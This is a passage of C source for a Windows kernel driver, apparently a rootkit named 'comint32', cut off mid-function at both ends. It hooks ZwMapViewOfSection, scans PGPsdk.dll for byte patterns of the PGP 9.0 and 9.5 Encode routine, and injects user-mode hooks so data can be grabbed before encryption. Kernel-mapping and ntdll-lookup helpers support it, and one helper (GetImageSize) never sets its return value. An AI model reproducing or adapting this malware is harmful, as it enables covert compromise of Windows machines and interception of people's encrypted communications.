
```c
IN HANDLE ProcessHandle,  
IN OUT PVOID *BaseAddress,  
IN ULONG ZeroBits,  
IN ULONG CommitSize,  
IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,  
IN OUT PSIZE_T ViewSize,  
IN SECTION_INHERIT InheritDisposition,  
IN ULONG AllocationType,  
IN ULONG Protect )  
{  
 NTSTATUS status;  
 // First complete the standard mapping process  
 status = OldZwMapViewOfSection(SectionHandle,  
  ProcessHandle,  
  BaseAddress,  
  ZeroBits,  
  CommitSize,  
  SectionOffset OPTIONAL,  
  ViewSize,  
  InheritDisposition,  
  AllocationType,  
  Protect );  
 // Now remap as required ( imageOffset only known for versions 4 & 5 )  
 if( NT_SUCCESS( status ) && ( majorVersion == 4 || majorVersion == 5 ) )  
 {  
  unsigned int imageOffset = 0;  
  VOID* pSection = NULL;  
  unsigned int imageSection = FALSE;  
  HANDLE hRoot = NULL;  
  PUNICODE_STRING objectName = NULL;  
  PVOID pImageBase = NULL;  
  UNICODE_STRING library1 = { 0 };  
  UNICODE_STRING library2 = { 0 };  
  CALL_DATA_STRUCT callData[TOTAL_HOOKS] = { 0 };  
  int hooks2inject = 0;  
  // Image location higher in version 4  
  if( majorVersion == 4 )  
   imageOffset = 24;  
  if( ObReferenceObjectByHandle(SectionHandle,  
   SECTION_MAP_EXECUTE,  
   *MmSectionObjectType,  
   KernelMode,  
   &pSection,  
   NULL ) == STATUS_SUCCESS )  
  {  
   // Check to see if this is an image section  
   // If it is, get the root handle and the object name  
   _asm  
   {  
    mov     edx, pSection  
    mov     eax, [edx+14h]  
    add     eax, imageOffset  
    mov     edx, [eax]  
    test    byte ptr [edx+20h], 20h  
    jz      not_image_section  
    mov     imageSection, TRUE  
    mov     eax, [edx+24h]  
    mov     edx, [eax+4]  
    mov     hRoot, edx  
    add     eax, 30h  
    mov     objectName, eax  
    not_image_section:  
   }  
   if( BaseAddress )  
    pImageBase = *BaseAddress;  
   // Mapping a DLL  
   if( imageSection && pImageBase && objectName && objectName->Length > 0 )  
   {  
    // define libraries of interest  
    RtlInitUnicodeString( &library1, L"kernel32.dll" );  
    RtlInitUnicodeString( &library2, L"PGPsdk.dll" );  
    if ( IsSameFile( &library1, objectName ) ) // kernel32  
    {  
     kernel32Base = pImageBase;  
    }  
    else if ( IsSameFile( &library2, objectName ) ) // PGPsdk  
    {  
     // Pattern for PGP 9.0 Encode  
     BYTE pattern1[] = { 0x55, 0x8B, 0xEC, 0x83, 0xE4, 0xF8, 0x81, 0xEC, \\  
      0xFC, 0x00, 0x00, 0x00, 0x53, 0x33, 0xC0, 0x56, \\  
      0x57, 0xB9, 0x26, 0x00, 0x00, 0x00, 0x8D, 0x7C, \\  
      0x24, 0x18, 0xF3, 0xAB };  
     PVOID pfEncode = GetFunctionAddress( pImageBase, NULL, pattern1,  
sizeof(pattern1) );  
     if( !pfEncode )  
     {  
      // Pattern for PGP 9.5 Encode  
      BYTE pattern2[] = { 0x81, 0xEC, 0xFC, 0x00, 0x00, 0x00, 0x53, 0x55, \\  
       0x33, 0xDB, 0x68, 0x98, 0x00, 0x00, 0x00, 0x8D, \\  
       0x44, 0x24, 0x14, 0x53, 0x50, 0x89, 0x9C, 0x24, \\  
       0xB4, 0x00, 0x00, 0x00 };  
      pfEncode = GetFunctionAddress( pImageBase, NULL, pattern2, sizeof(pattern2)  

);  
     }  
     if( pfEncode )  
     {  
      hooks2inject = 1;  
      callData[0].index = USERHOOK_beforeEncode;  
      callData[0].hookFunction = pfEncode;  
      callData[0].parameters = 2;  
      callData[0].callType = CDECL_TYPE;  
      callData[0].stackOffset = 0;  
      DbgPrint("comint32: NewZwMapViewOfSection pfEncode = %x",pfEncode);  
     }  
     else  
     {  
      DbgPrint("comint32:   PGP Encode not found.");  
     }  
    }  
    if( hooks2inject > 0 )  
    {  
     PCHAR injectedMemory;  
     // prepare memory  
     injectedMemory = allocateUserMemory();  
     // inject  
     if( !processInject( (CALL_DATA_STRUCT*)&callData, hooks2inject, injectedMemory  

) )  
     {  
      DbgPrint("comint32: processInject failed!\\n" );  
     }  
    }  
   }  
   ObDereferenceObject( pSection );  
  }  
 }  
 return status;  
}  

// Used to compare a full path to a file name  
BOOL IsSameFile(PUNICODE_STRING shortString, PUNICODE_STRING longString)  
{  
 USHORT index;  
 USHORT longLen;  
 USHORT shortLen;  
 USHORT count;  
 index = longString->Length / 2; // wchar_t len is length / 2  
 // search backwards for backslash  
 while( --index )  
  if ( longString->Buffer[index] == L'\\\\' )  
   break;  
 // check for same length first  
 longLen = (longString->Length / 2) - index - 1;  
 shortLen = shortString->Length / 2;  
 if( shortLen != longLen )  
  return FALSE;  
 // Compare  
 count = 0;  
 while ( count < longLen )  
  if ( longString->Buffer[++index] != shortString->Buffer[count++] )  
   return FALSE;  
 // Match!  
 return TRUE;  
}  

// Compare to char strings  
BOOL IsSameString( char* first, char* second )  
{  
 while( *first && *second )  
 {  
  if( tolower( *first ) != tolower( *second ) )  
   return FALSE;  
  first++;  
  second++;  
 }  
 if( *first || *second )  
  return FALSE;  
 // strings match!  
 return TRUE;  
}  

// Map user address space into the kernel  
PVOID MapKernelAddress( PVOID pAddress, PMDL* ppMDL, ULONG size )  
{  
 PVOID pMappedAddr = NULL;  
 *ppMDL = IoAllocateMdl( pAddress, size, FALSE, FALSE, NULL );  
 if( *ppMDL == NULL )  
  return NULL;  
 __try  
 {  
  MmProbeAndLockPages( *ppMDL, KernelMode ,IoReadAccess );  
 }  
 __except( EXCEPTION_EXECUTE_HANDLER )  
 {  
  IoFreeMdl( *ppMDL );  
  *ppMDL = NULL;  
  return NULL;  
 }  
 pMappedAddr = MmGetSystemAddressForMdlSafe( *ppMDL, HighPagePriority );  
 if( !pMappedAddr )  
 {  
  MmUnlockPages( *ppMDL );  
  IoFreeMdl( *ppMDL );  
  *ppMDL = NULL;  
  return NULL;  
 }  
 return pMappedAddr;  
}  

// Free kernel space after mapping in user memory  
VOID FreeKernelAddress( PVOID* ppMappedAddr, PMDL* ppMDL )  
{  
 if( *ppMappedAddr && *ppMDL )  
  MmUnmapLockedPages( *ppMappedAddr, *ppMDL );  
 *ppMappedAddr = NULL;  
  if( *ppMDL )  
  {  
   MmUnlockPages( *ppMDL );  
   IoFreeMdl( *ppMDL );  
  }  
  *ppMDL = NULL;  
}  

// get DOS Header -> NT Header -> Optinal Header -> SizeOfImage  
ULONG GetImageSize( PVOID baseAddress )  
{  
 PIMAGE_DOS_HEADER pDOSHeader;  
 PIMAGE_NT_HEADER pNTHeader;  
 ULONG imageSize = 0;  
 PVOID pTempNTHeader;  
 PVOID mappedBase;  
 PMDL pMDL;  
 mappedBase = MapKernelAddress( baseAddress, &pMDL, sizeof(PIMAGE_DOS_HEADER) );  
 if( mappedBase )  
 {  
  pDOSHeader = (PIMAGE_DOS_HEADER)mappedBase;  
  pTempNTHeader = (PVOID)(pDOSHeader->e_lfanew);  
  FreeKernelAddress( &mappedBase, &pMDL );  
  mappedBase = MapKernelAddress( (PVOID)((ULONG)baseAddress +  

(ULONG)pTempNTHeader), &pMDL, sizeof(PIMAGE_NT_HEADER) );  
  if( mappedBase )  
  {  
   pNTHeader = (PIMAGE_NT_HEADER)mappedBase;  
   FreeKernelAddress( &mappedBase, &pMDL );  
  }  
 }  
 return imageSize;  
}  

// find an undocumented ntdll function  
PVOID findUnresolved( PVOID pFunc )  
{  
 UCHAR pattern[5] = { 0 };  
 PUCHAR bytePtr = NULL;  
 PULONG oldStart = 0;  
 ULONG newStart = 0;  
 memcpy( pattern, pFunc, 5 );  
 // subtract offset  
 oldStart = (PULONG)&(pattern[1]);  
 newStart = *oldStart - 1;  
 *oldStart = newStart;  
 // Search for pattern  
 for( bytePtr = (PUCHAR)pFunc - 5; bytePtr >= (PUCHAR)pFunc - 0x800; bytePtr-- )  
  if( checkPattern( bytePtr, pattern, 5 ) == 0 )  
   return (PVOID)bytePtr;  
 // pattern not found  
 return NULL;  
}  

// Get the address of a function from a DLL  
// Pass in the base address of the DLL  
// Pass function name OR pattern and pettern length  
PVOID GetFunctionAddress(PVOID BaseAddress,  
  char* functionName,  
  PBYTE pattern,  
  size_t patternLength  )  
{
```
